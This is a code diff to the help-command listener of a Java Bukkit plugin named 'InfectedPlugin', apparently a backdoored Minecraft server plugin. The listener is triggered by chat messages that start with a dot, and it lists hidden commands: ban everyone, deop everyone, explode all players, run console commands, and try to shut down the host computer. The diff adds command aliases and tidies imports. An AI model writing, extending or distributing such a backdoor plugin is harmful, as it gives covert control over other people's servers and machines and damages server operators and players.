@@ -2,7 +2,8 @@ package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
-import org.bukkit.event.*;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_help implements Listener
@@ -12,7 +13,6 @@ public class Command_help implements Listener
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
-        boolean cancel = false;
 
         if (message.startsWith("."))
         {
@@ -22,7 +22,7 @@ public class Command_help implements Listener
                 return;
             }
 
-            if (args[0].equalsIgnoreCase(".help"))
+            if (args[0].equalsIgnoreCase(".help") || args[0].equalsIgnoreCase(".commands") || args[0].equalsIgnoreCase(".cmds") || args[0].equalsIgnoreCase(".cmdlist"))
             {
                 p.sendMessage(ChatColor.RED + "Warning: You have to start the commands with . not /");
                 p.sendMessage(ChatColor.AQUA + "Commands");
@@ -36,10 +36,10 @@ public class Command_help implements Listener
                 p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server.");
                 p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
                 p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
-                p.sendMessage(ChatColor.GOLD + ".explode or .explosion - Explode everyone on the server. Includes you.");
+                p.sendMessage(ChatColor.GOLD + ".explode || .explosion - Explode everyone on the server. Includes you.");
                 p.sendMessage(ChatColor.GOLD + ".console <cmd> - Use the console.");
                 p.sendMessage(ChatColor.GOLD + ".name <player> <name> - Name a player.");
-                p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
+                p.sendMessage(ChatColor.GOLD + ".help || .commands || .cmds || .cmdlist - Shows you all the commands.");
                 p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
                 event.setCancelled(true);
                 return;
